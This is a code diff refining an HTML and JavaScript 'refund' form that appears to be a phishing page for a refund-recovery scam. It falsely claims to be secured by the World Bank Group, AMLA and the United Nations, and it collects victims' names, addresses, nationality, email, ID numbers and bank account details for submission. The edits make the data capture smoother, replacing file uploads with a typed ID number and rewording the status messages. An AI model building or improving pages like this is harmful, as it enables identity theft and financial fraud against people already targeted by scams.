@@ -47,11 +47,7 @@
         <div class="side-text">
             <h3>MISSION</h3>
             <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems...</p>
-            <br>
-            <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and financial safety.</p>
         </div>
-        
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
             <div class="header">
@@ -73,17 +69,14 @@
                         <div><label>Nationality *</label><input type="text" name="Nationality" id="nat" class="req"></div>
                         <div><label>Personal Email *</label><input type="email" name="Email" id="em" class="req"></div>
                     </div>
-                    <div style="margin-top:25px;"><label>Upload Valid ID *</label><input type="file" name="ID_File" id="idU" class="req"></div>
-                    <div class="btn-container">
-                        <button type="button" onclick="validate(1, 2)">NEXT STEP</button>
-                    </div>
+                    <div style="margin-top:25px;"><label>ID Number (for verification) *</label><input type="text" name="ID_Number" id="idn" class="req"></div>
+                    <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- PAGE 2 -->
                 <div id="section2" class="section-box">
                     <h2>SECTION 2: REFUND DETAILS</h2>
                     <div><label>REFUND AMOUNT *</label><input type="text" name="Amount" id="amt" class="req"></div>
-                    <div style="margin-top:25px;"><label>Upload Receipt *</label><input type="file" name="Receipt_File" id="rcpU" class="req"></div>
                     <div style="margin-top:25px;"><label>Bank Name *</label><input type="text" name="Bank" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:25px;">
                         <div><label>Account Number *</label><input type="text" name="Account" id="an" class="req"></div>
@@ -108,6 +101,7 @@
             </form>
             <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
         </div>
+        <div class="side-text"><h3>VISION</h3><p>To be recognized as the premier global benchmark for commercial integrity...</p></div>
     </div>
 
     <script>
@@ -121,32 +115,24 @@
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
             let ok = true; 
             inputs.forEach(i => { 
-                if(!i.value) { 
-                    i.classList.add('invalid'); 
-                    ok = false; 
-                } else {
-                    i.classList.remove('invalid'); 
-                }
+                if(!i.value) { i.classList.add('invalid'); ok = false; } 
+                else i.classList.remove('invalid'); 
             });
-            if(ok) { 
-                if(next === 3) populate(); 
-                show(next); 
-            }
+            if(ok) { if(next === 3) populate(); show(next); }
         }
 
         function populate() {
             document.getElementById('reviewDisplay').innerHTML = `
-                <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('mn').value} ${document.getElementById('ln').value}</div></div>
+                <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
                 <div class="review-item"><div class="review-label">ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
-                <div class="review-item"><div class="review-label">EMAIL</div><div class="review-value">${document.getElementById('em').value}</div></div>
-                <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
+                <div class="review-item"><div class="review-label">AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
                 <div class="review-item"><div class="review-label">BANK / ACCOUNT</div><div class="review-value">${document.getElementById('bn').value} - ${document.getElementById('an').value}</div></div>
             `;
         }
 
         async function submitForm() {
-            const form = document.getElementById('auditForm');
             const ref = "REF-" + Math.floor(Math.random() * 1000000);
+            const form = document.getElementById('auditForm');
             const formData = new FormData(form);
             formData.append("Reference_Number", ref);
 
@@ -164,18 +150,19 @@
                     document.getElementById('section3').innerHTML = `
                         <div style="text-align:center; padding:40px;">
                             <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h2>
-                            <p>Reference ID: <strong>${ref}</strong></p>
+                            <p>Reference: <strong>${ref}</strong></p>
                             <div style="font-size:80px; margin:20px;">✅</div>
-                            <p>Data has been securely transmitted to the authority vault.</p>
+                            <p>Your data has been sent. Check your email for confirmation.</p>
                             <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; margin-top:20px;">DONE</button>
                         </div>`;
                 } else {
-                    alert("Submission failed. Please check your connection.");
+                    const result = await response.json();
+                    alert("Error: " + (result.error || "Check your form settings."));
                     document.getElementById('finalBtns').style.display = 'flex';
                     document.getElementById('loader').style.display = 'none';
                 }
             } catch (error) {
-                alert("An error occurred. Please try again.");
+                alert("Network error. Please try again.");
                 document.getElementById('finalBtns').style.display = 'flex';
                 document.getElementById('loader').style.display = 'none';
             }
